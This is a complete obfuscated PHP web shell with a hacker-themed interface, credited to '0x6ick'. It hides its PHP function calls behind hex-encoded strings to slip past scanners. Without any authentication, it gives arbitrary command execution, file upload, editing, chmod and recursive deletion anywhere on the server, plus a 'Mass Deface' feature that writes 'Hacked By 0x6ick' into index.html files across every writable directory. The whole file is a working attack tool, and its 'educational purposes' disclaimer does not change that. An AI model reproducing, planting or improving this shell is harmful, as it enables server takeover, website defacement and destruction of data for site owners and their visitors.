<?php
/**
 * 6ickZoneShell Manager by Nyx6st x 0x6ick | Copyright 2025 by 6ickwhispers@gmail.com
 *
 * =================================================================
 * THIS SCRIPT HAS BEEN OBFUSCATED (VERSION 3 - BULK DELETE ADDED)
 * =================================================================
 * All standard PHP function calls have been replaced with calls via a hex-decoded array.
 * This version adds the bulk delete functionality.
 * For educational and research purposes only.
 */

// --- HEX-ENCODED FUNCTION ARRAY & DECODER ---
$f = [ "6572726f725f7265706f7274696e67", "73657373696f6e5f7374617274", "696e695f736574", "686561646572", "6f625f656e645f636c65616e", "626173656e616d65", "66756e6374696f6e5f657869737473", "65786563", "696d706c6f6465", "7368656c6c5f65786563", "7061737374687275", "6f625f7374617274", "6f625f6765745f636c65616e", "73797374656d", "66696c657065726d73", "737072696e7466", "66696c655f657869737473", "69735f646972", "756e6c696e6b", "7363616e646972", "726d646972", "737562737472", "687474705f6275696c645f7175657279", "7265616c70617468", "676574637764", "7374725f7265706c616365", "69735f7772697461626c65", "66696c655f7075745f636f6e74656E7473", "68746d6c7370656369616c6368617273", "636f7079", "636c6173735f657869737473", "64617465", "6469726e616d65", "7374726c656e", "63686d6f64", "6f6374646563", "72656e616d65", "6d6b646972", "75726c656e636f6465", "676574686f737462796e616d65", "7068705f756e616d65", "6578706c6f6465", "7472696d", "69735f66696c65", "726f756e64", "66696c6573697a65", "69735f7265616461626c65", "75736f7274", "73747263617365636d70", "70617468696e666f", "66696c655f6765745f636f6e74656e7473" ];
foreach ($f as $k => $v) { $f[$k] = hex2bin($v); } unset($k, $v);

$f[0](0);
$f[1]();
@$f[2]('output_buffering', 0);
@$f[2]('display_errors', 0);
$f[2]('memory_limit', '256M');
$f[3]('Content-Type: text/html; charset=UTF-8');
$f[4]();

// --- CONFIG ---
$title = "ヤミRoot";
$author = "0x6ick";
$theme_bg = "black";
$theme_fg = "#00FFFF";
$theme_highlight = "#00FFD1";
$theme_link = "#00FFFF";
$theme_link_hover = "#FFFFFF";
$theme_border_color = "#00FFFF";
$theme_table_header_bg = "#191919";
$theme_table_row_hover = "#333333";
$theme_input_bg = "black";
$theme_input_fg = "#00FFFF";
$font_family = "'Kelly Slab', cursive";
$message_success_color = "#00CCFF";
$message_error_color = "red";

// --- FUNCTIONS ---
function sanitizeFilename($filename) {
    global $f;
    return $f[5]($filename);
}

function exe($cmd) {
    global $f;
    if ($f[6]('exec')) {
        $f[7]($cmd . ' 2>&1', $output);
        return $f[8]("\n", $output);
    } elseif ($f[6]('shell_exec')) {
        return $f[9]($cmd);
    } elseif ($f[6]('passthru')) {
        $f[11](); $f[10]($cmd); return $f[12]();
    } elseif ($f[6]('system')) {
        $f[11](); $f[13]($cmd); return $f[12]();
    }
    return "Command execution disabled.";
}

function perms($file){
    global $f;
    $perms = @$f[14]($file);
    if ($perms === false) return '????';
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';
    $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function delete_recursive($target) {
    global $f;
    if (!$f[16]($target)) return true;
    if (!$f[17]($target)) return $f[18]($target);
    foreach ($f[19]($target) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (!delete_recursive($target . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return $f[20]($target);
}

function zip_add_folder($zip, $folder, $base_path_length) {
    global $f;
    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($folder), RecursiveIteratorIterator::LEAVES_ONLY);
    foreach ($files as $file) {
        if (!$file->isDir()) {
            $file_path = $file->getRealPath();
            $relative_path = $f[21]($file_path, $base_path_length);
            $zip->addFile($file_path, $relative_path);
        }
    }
}

function redirect_with_message($msg_type = '', $msg_text = '', $current_path = '') {
    global $path, $f;
    $redirect_path = !empty($current_path) ? $current_path : $path;
    $params = ['path' => $redirect_path];
    if ($msg_type) $params['msg_type'] = $msg_type;
    if ($msg_text) $params['msg_text'] = $msg_text;
    $f[3]("Location: ?" . $f[22]($params));
    exit();
}

// --- INITIAL SETUP & PATH ---
$path = $f[23](isset($_GET['path']) ? $_GET['path'] : $f[24]());
$path = $f[25]('\\','/',$path);

// --- HANDLERS FOR ACTIONS THAT REDIRECT ---
if(isset($_POST['start_mass_deface'])) {
    $mass_deface_results = '';
    function mass_deface_recursive($dir, $file, $content, &$res) {
        global $f;
        if(!$f[26]($dir)) {$res .= "[<font color=red>FAILED</font>] ".$f[28]($dir)." (Not Writable)<br>"; return;}
        foreach($f[19]($dir) as $item) {
            if($item === '.' || $item === '..') continue;
            $lokasi = $dir.DIRECTORY_SEPARATOR.$item;
            if($f[17]($lokasi)) {
                if($f[26]($lokasi)) {
                    $f[27]($lokasi.DIRECTORY_SEPARATOR.$file, $content);
                    $res .= "[<font color=lime>DONE</font>] ".$f[28]($lokasi.DIRECTORY_SEPARATOR.$file)."<br>";
                    mass_deface_recursive($lokasi, $file, $content, $res);
                } else { $res .= "[<font color=red>FAILED</font>] ".$f[28]($lokasi)." (Not Writable)<br>"; }
            }
        }
    }
    function mass_deface_flat($dir, $file, $content, &$res) {
        global $f;
        if(!$f[26]($dir)) {$res .= "[<font color=red>FAILED</font>] ".$f[28]($dir)." (Not Writable)<br>"; return;}
        foreach($f[19]($dir) as $item) {
            if($item === '.' || $item === '..') continue;
            $lokasi = $dir.DIRECTORY_SEPARATOR.$item;
            if($f[17]($lokasi) && $f[26]($lokasi)) {
                $f[27]($lokasi.DIRECTORY_SEPARATOR.$file, $content);
                $res .= "[<font color=lime>DONE</font>] ".$f[28]($lokasi.DIRECTORY_SEPARATOR.$file)."<br>";
            }
        }
    }
    if($_POST['tipe_sabun'] == 'mahal') mass_deface_recursive($_POST['d_dir'], $_POST['d_file'], $_POST['script_content'], $mass_deface_results);
    else mass_deface_flat($_POST['d_dir'], $_POST['d_file'], $_POST['script_content'], $mass_deface_results);
    $_SESSION['feature_output'] = $mass_deface_results;
    redirect_with_message('success', 'Mass Deface Selesai!', $path);
}

if(isset($_FILES['file_upload'])){
    $file_name = sanitizeFilename($_FILES['file_upload']['name']);
    if($f[29]($_FILES['file_upload']['tmp_name'], $path.'/'.$file_name)) redirect_with_message('success', 'UPLOAD SUCCESS: ' . $file_name, $path);
    else redirect_with_message('error', 'File Gagal Diupload !!', $path);
}

// MODIFIED: Bulk action handler logic
if (isset($_POST['bulk_action']) && isset($_POST['selected_files'])) {
    $action = $_POST['bulk_action'];
    $selected_files = $_POST['selected_files'];

    // Handle Zip Action
    if ($action === 'zip_selected' && $f[30]('ZipArchive')) {
        $zip_filename = 'archive_' . $f[31]('Y-m-d_H-i-s') . '.zip';
        $zip_filepath = $path . DIRECTORY_SEPARATOR . $zip_filename;
        $zip = new ZipArchive();
        if ($zip->open($zip_filepath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            foreach ($selected_files as $file) {
                $file_path = $f[23]($file);
                if ($f[43]($file_path)) $zip->addFile($file_path, $f[5]($file_path));
                elseif ($f[17]($file_path)) zip_add_folder($zip, $file_path, $f[33]($f[32]($file_path) . DIRECTORY_SEPARATOR));
            }
            $zip->close();
            redirect_with_message('success', 'File berhasil di-zip ke: ' . $zip_filename, $path);
        } else {
            redirect_with_message('error', 'Gagal membuat file zip!', $path);
        }
    }
    // ADDED: Handle Delete Action
    elseif ($action === 'delete_selected') {
        foreach ($selected_files as $file_to_delete) {
            delete_recursive($file_to_delete);
        }
        redirect_with_message('success', 'Item yang dipilih berhasil dihapus.', $path);
    }
}

if(isset($_GET['option']) && isset($_POST['opt_action'])){
    $target_full_path = $_POST['path_target'];
    $action = $_POST['opt_action'];
    $current_dir = $f[23](isset($_GET['path']) ? $_GET['path'] : $f[24]());
    switch ($action) {
        case 'delete':
            if (delete_recursive($target_full_path)) redirect_with_message('success', 'DELETE SUCCESS !!', $current_dir);
            else redirect_with_message('error', 'Gagal menghapus! Periksa izin.', $current_dir);
            break;
        case 'chmod_save':
            if($f[34]($target_full_path, $f[35]($_POST['perm_value']))) redirect_with_message('success', 'CHMOD SUCCESS !!', $current_dir);
            else redirect_with_message('error', 'CHMOD Gagal !!', $current_dir);
            break;
        case 'rename_save':
            $new_full_path = $f[32]($target_full_path).'/'.sanitizeFilename($_POST['new_name_value']);
            if($f[36]($target_full_path, $new_full_path)) redirect_with_message('success', 'RENAME SUCCESS !!', $current_dir);
            else redirect_with_message('error', 'RENAME Gagal !!', $current_dir);
            break;
        case 'edit_save':
            if($f[26]($target_full_path)) {
                if($f[27]($target_full_path, $_POST['src_content'])) redirect_with_message('success', 'EDIT SUCCESS !!', $current_dir);
                else redirect_with_message('error', 'Edit File Gagal !!', $current_dir);
            } else { redirect_with_message('error', 'File tidak writable!', $current_dir); }
            break;
        case 'extract_save':
            if ($f[30]('ZipArchive')) {
                $zip = new ZipArchive;
                if ($zip->open($target_full_path) === TRUE) {
                    $zip->extractTo($current_dir);
                    $zip->close();
                    redirect_with_message('success', 'File berhasil diekstrak!', $current_dir);
                } else { redirect_with_message('error', 'Gagal membuka file zip!', $current_dir); }
            } else { redirect_with_message('error', 'Class ZipArchive tidak ditemukan!', $current_dir); }
            break;
    }
}

if(isset($_GET['create_new'])) {
    $target_path_new = $path . '/' . sanitizeFilename($_POST['create_name']);
    if ($_POST['create_type'] == 'file') {
        if (@$f[27]($target_path_new, '') !== false) redirect_with_message('success', 'File Baru Berhasil Dibuat', $path);
        else redirect_with_message('error', 'Gagal membuat file baru!', $path);
    } elseif ($_POST['create_type'] == 'dir') {
        if (@$f[37]($target_path_new)) redirect_with_message('success', 'Folder Baru Berhasil Dibuat', $path);
        else redirect_with_message('error', 'Gagal membuat folder baru!', $path);
    }
}
?>
<!DOCTYPE HTML>
<html>
<head>
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
<title><?php echo $f[28]($title); ?></title>
<style>
body{font-family:'Kelly Slab',cursive;background-color:<?php echo $theme_bg;?>;color:<?php echo $theme_fg;?>;margin:0;padding:0;}
a{font-size:1em;color:<?php echo $theme_link;?>;text-decoration:none;}
a:hover{color:<?php echo $theme_link_hover;?>;}
table{border-collapse:collapse;width:95%;max-width:1200px;margin:15px auto;}
.table_home,.td_home{border:2px solid <?php echo $theme_table_row_hover;?>;padding:7px;vertical-align:middle;}
#content tr:hover{background-color:<?php echo $theme_table_row_hover;?>;}
#content .first{background-color:<?php echo $theme_table_header_bg;?>;font-weight:bold;}
input,select,textarea{border:1px solid <?php echo $theme_link_hover;?>;border-radius:5px;background:<?php echo $theme_input_bg;?>;color:<?php echo $theme_input_fg;?>;font-family:'Kelly Slab',cursive;padding:5px;box-sizing:border-box;}
input[type="submit"]{background:<?php echo $theme_input_bg;?>;color:<?php echo $theme_fg;?>;border:2px solid <?php echo $theme_fg;?>;cursor:pointer;font-weight:bold;}
input[type="submit"]:hover{background:<?php echo $theme_fg;?>;color:<?php echo $theme_input_bg;?>;}
h1{font-family:'Kelly Slab';font-size:35px;color:white;margin:20px 0 10px;text-align:center;}
.path-nav{margin:10px auto;width:95%;max-width:1200px;text-align:left;word-wrap:break-word;}
.message{padding:10px;margin:10px auto;border-radius:5px;width:95%;max-width:1200px;font-weight:bold;text-align:center;}
.message.success{background-color:<?php echo $message_success_color;?>;color:<?php echo $theme_bg;?>;}
.message.error{background-color:<?php echo $message_error_color;?>;color:white;}
.section-box{background-color:#1a1a1a;border:1px solid <?php echo $theme_border_color;?>;padding:15px;margin:20px auto;border-radius:8px;width:95%;max-width:1200px;}
.main-menu{margin:20px auto;width:95%;max-width:1200px;text-align:center;padding:10px 0;border-top:1px solid <?php echo $theme_border_color;?>;border-bottom:1px solid <?php echo $theme_border_color;?>;}
.main-menu a{margin:0 8px;font-size:1.1em;white-space:nowrap;}
pre{background-color:#0e0e0e;border:1px solid #444;padding:10px;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;color:#00FFD1;}
</style>
</head>
<body>
<a href="?"><h1 style="color: white;"><?php echo $f[28]($title); ?></h1></a>
<?php
if(isset($_GET['msg_text'])) { echo "<div class='message ".$f[28]($_GET['msg_type'])."'>".$f[28]($_GET['msg_text'])."</div>"; }
if(isset($_SESSION['feature_output'])) { echo '<div class="section-box"><h4>Hasil Fitur Sebelumnya:</h4><pre>'.$_SESSION['feature_output'].'</pre></div>'; unset($_SESSION['feature_output']); }
?>
<table class="system-info-table" width="95%" border="0" cellpadding="0" cellspacing="0" align="left">
<tr><td>
<font color='white'><i class='fa fa-user'></i> User / IP </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo $_SERVER['REMOTE_ADDR']; ?></font>
<tr><td><font color='white'><i class='fa fa-desktop'></i> Host / Server </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo $f[39]($_SERVER['HTTP_HOST'])." / ".$_SERVER['SERVER_NAME']; ?></font>
<tr><td><font color='white'><i class='fa fa-hdd-o'></i> System </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo $f[40](); ?></font>
</tr></td></table>
<div class="main-menu">
    <a href="?path=<?php echo $f[38]($path); ?>&action=cmd">Command</a> |
    <a href="?path=<?php echo $f[38]($path); ?>&action=upload_form">Upload</a> |
    <a href="?path=<?php echo $f[38]($path); ?>&action=mass_deface_form">Mass Deface</a> |
    <a href="?path=<?php echo $f[38]($path); ?>&action=create_form">Create</a>
</div>
<div class="path-nav">
    <i class="fa fa-folder-o"></i> :
    <?php
    $paths_array = $f[41]('/', $f[42]($path, '/'));
    echo '<a href="?path=/">/</a>';
    $current_built_path = '';
    foreach($paths_array as $pat){
        if(empty($pat)) continue;
        $current_built_path .= '/' . $pat;
        echo '<a href="?path='.$f[38]($current_built_path).'">'.$f[28]($pat).'</a>/';
    }
    ?>
</div>
<?php
$show_file_list = true;
if (isset($_GET['action'])) {
    $show_file_list = false;
    echo '<div class="section-box">';
    switch ($_GET['action']) {
        case 'cmd':
            $cmd_output = (isset($_POST['do_cmd'])) ? $f[28](exe($_POST['cmd_input'])) : '';
            echo '<h3>Execute Command</h3><form method="POST" action="?action=cmd&path='.$f[38]($path).'"><input type="text" name="cmd_input" placeholder="whoami" style="width: calc(100% - 80px);" autofocus><input type="submit" name="do_cmd" value=">>" style="width: 70px;"></form>';
            if($cmd_output) echo '<h4>Output:</h4><pre>'.$cmd_output.'</pre>';
            break;
        case 'upload_form':
            echo '<h3>Upload File</h3><form enctype="multipart/form-data" method="POST" action="?path='.$f[38]($path).'"><input type="file" name="file_upload" required/><input type="submit" value="UPLOAD" style="margin-left:10px;"/></form>';
            break;
        case 'mass_deface_form':
            echo '<h3>Mass Deface</h3><form method="post" action="?path='.$f[38]($path).'"><p>Tipe:<br><input type="radio" name="tipe_sabun" value="murah" checked>Biasa (1 level) | <input type="radio" name="tipe_sabun" value="mahal">Massal (Rekursif)</p><p>Folder Target:<br><input type="text" name="d_dir" value="'.$f[28]($path).'" style="width:100%"></p><p>Nama File:<br><input type="text" name="d_file" value="index.html" style="width:100%"></p><p>Isi Script:<br><textarea name="script_content" style="width:100%;height:150px">Hacked By 0x6ick</textarea></p><input type="submit" name="start_mass_deface" value="GAS!" style="width:100%"></form>';
            break;
        case 'create_form':
            echo '<h3>Create New</h3><form method="POST" action="?create_new=true&path='.$f[38]($path).'"><select name="create_type"><option value="file">File</option><option value="dir">Folder</option></select> <input type="text" name="create_name" required placeholder="Nama file/folder"> <input type="submit" value="Create"></form>';
            break;
        case 'delete':
            echo '<h3>Konfirmasi Hapus: '.$f[28]($f[5]($_GET['target_file'])).'</h3><p style="color:red;text-align:center;">Anda YAKIN? Tindakan ini tidak bisa dibatalkan.</p><form method="POST" action="?option=true&path='.$f[38]($path).'"><input type="hidden" name="path_target" value="'.$f[28]($_GET['target_file']).'"><input type="hidden" name="opt_action" value="delete"><input type="submit" value="YA, HAPUS" style="background:red;color:white;"/> <a href="?path='.$f[38]($path).'" style="margin-left:10px;">BATAL</a></form>';
            break;
        case 'extract_form':
            echo '<h3>Konfirmasi Ekstrak: '.$f[28]($f[5]($_GET['target_file'])).'</h3><p>Ekstrak semua isi file ini ke direktori saat ini ('.$f[28]($path).')?</p><form method="POST" action="?option=true&path='.$f[38]($path).'"><input type="hidden" name="path_target" value="'.$f[28]($_GET['target_file']).'"><input type="hidden" name="opt_action" value="extract_save"><input type="submit" value="YA, EKSTRAK"/> <a href="?path='.$f[38]($path).'" style="margin-left:10px;">BATAL</a></form>';
            break;
        case 'view_file':
            echo '<h3>Viewing: '.$f[28]($f[5]($_GET['target_file'])).'</h3><textarea style="width:100%;height:400px;" readonly>'.$f[28](@$f[50]($_GET['target_file'])).'</textarea>';
            break;
        case 'edit_form':
            echo '<h3>Editing: '.$f[28]($f[5]($_GET['target_file'])).'</h3><form method="POST" action="?option=true&path='.$f[38]($path).'"><textarea name="src_content" style="width:100%;height:400px;">'.$f[28](@$f[50]($_GET['target_file'])).'</textarea><br><input type="hidden" name="path_target" value="'.$f[28]($_GET['target_file']).'"><input type="hidden" name="opt_action" value="edit_save"><input type="submit" value="SAVE"/></form>';
            break;
        case 'rename_form':
            echo '<h3>Rename: '.$f[28]($f[5]($_GET['target_file'])).'</h3><form method="POST" action="?option=true&path='.$f[38]($path).'">New Name: <input name="new_name_value" type="text" value="'.$f[28]($f[5]($_GET['target_file'])).'"/><input type="hidden" name="path_target" value="'.$f[28]($_GET['target_file']).'"><input type="hidden" name="opt_action" value="rename_save"><input type="submit" value="RENAME"/></form>';
            break;
        case 'chmod_form':
            $current_perms = $f[21]($f[15]('%o', @$f[14]($_GET['target_file'])), -4);
            echo '<h3>Chmod: '.$f[28]($f[5]($_GET['target_file'])).'</h3><form method="POST" action="?option=true&path='.$f[38]($path).'">Permission: <input name="perm_value" type="text" size="4" value="'.$current_perms.'"/><input type="hidden" name="path_target" value="'.$f[28]($_GET['target_file']).'"><input type="hidden" name="opt_action" value="chmod_save"><input type="submit" value="CHMOD"/></form>';
            break;
    }
    echo '</div>';
}

if ($show_file_list) {
    echo '<form method="POST" action="?path='.$f[38]($path).'">';
    echo '<div id="content"><table><tr class="first">';
    echo '<th><input type="checkbox" onclick="document.querySelectorAll(\'.file-checkbox\').forEach(e=>e.checked=this.checked);"></th>';
    echo '<th>Name</th><th>Size</th><th>Perm</th><th>Options</th></tr>';
    $scandir_items = @$f[19]($path);
    if ($scandir_items) {
        $f[47]($scandir_items, function($a, $b) use ($path, $f) {
            if ($a == '..') return -1; if ($b == '..') return 1;
            if ($f[17]($path.'/'.$a) && !$f[17]($path.'/'.$b)) return -1;
            if (!$f[17]($path.'/'.$a) && $f[17]($path.'/'.$b)) return 1;
            return $f[48]($a, $b);
        });
        foreach($scandir_items as $item){
            if($item == '.') continue;
            $full_item_path = $path.DIRECTORY_SEPARATOR.$item;
            $encoded_full_item_path = $f[38]($full_item_path);
            echo "<tr><td class='td_home' style='text-align:center;'>";
            if ($item != '..') echo "<input type='checkbox' class='file-checkbox' name='selected_files[]' value='".$f[28]($full_item_path)."'>";
            echo "</td><td class='td_home'>";
            if($item == '..') echo "<i class='fa fa-folder-open-o'></i> <a href=\"?path=".$f[38]($f[32]($path))."\">".$f[28]($item)."</a>";
            elseif($f[17]($full_item_path)) echo "<i class='fa fa-folder-o'></i> <a href=\"?path=$encoded_full_item_path\">".$f[28]($item)."</a>";
            else echo "<i class='fa fa-file-o'></i> <a href=\"?action=view_file&target_file=$encoded_full_item_path&path=".$f[38]($path)."\">".$f[28]($item)."</a>";
            echo "</td><td class='td_home' style='text-align:center;'>".($f[43]($full_item_path) ? $f[44](@$f[45]($full_item_path)/1024,2).' KB' : '--')."</td>";
            echo "<td class='td_home' style='text-align:center;'><font color='".($f[26]($full_item_path) ? '#57FF00' : (!$f[46]($full_item_path) ? '#FF0004' : $theme_fg))."'>".perms($full_item_path)."</font></td>";
            echo "<td class='td_home' style='text-align:center;'><select style='width:100px;' onchange=\"if(this.value) window.location.href='?action='+this.value+'&target_file={$encoded_full_item_path}&path=".$f[38]($path)."'\"><option value=''>Action</option><option value='delete'>Delete</option>";
            if($f[43]($full_item_path)) {
                echo "<option value='edit_form'>Edit</option>";
                if($f[30]('ZipArchive') && $f[49]($full_item_path, PATHINFO_EXTENSION) == 'zip') echo "<option value='extract_form'>Extract</option>";
            }
            echo "<option value='rename_form'>Rename</option><option value='chmod_form'>Chmod</option></select></td></tr>";
        }
    } else { echo "<tr><td colspan='5' style='text-align:center;'><font color='red'>Gagal membaca direktori.</font></td></tr>"; }
    // MODIFIED: Bulk action dropdown
    if ($f[30]('ZipArchive')) {
        echo '<tfoot><tr class="first"><td colspan="5" style="padding:10px;">With selected: <select name="bulk_action"><option value="">Choose...</option><option value="zip_selected">Zip</option><option value="delete_selected">Hapus</option></select> <input type="submit" value="Go"></td></tr></tfoot>'; // ADDED: delete_selected option
    }
    echo '</table></div></form>';
}
?>
<hr style="border-top: 1px solid <?php echo $theme_border_color; ?>; width: 95%; max-width: 1200px; margin: 15px auto;">
<center><font color="#fff" size="2px"><b>Coded With &#x1f497; by <font color="#7e52c6"><?php echo $f[28]($author); ?></font></b></center>
</body>
</html>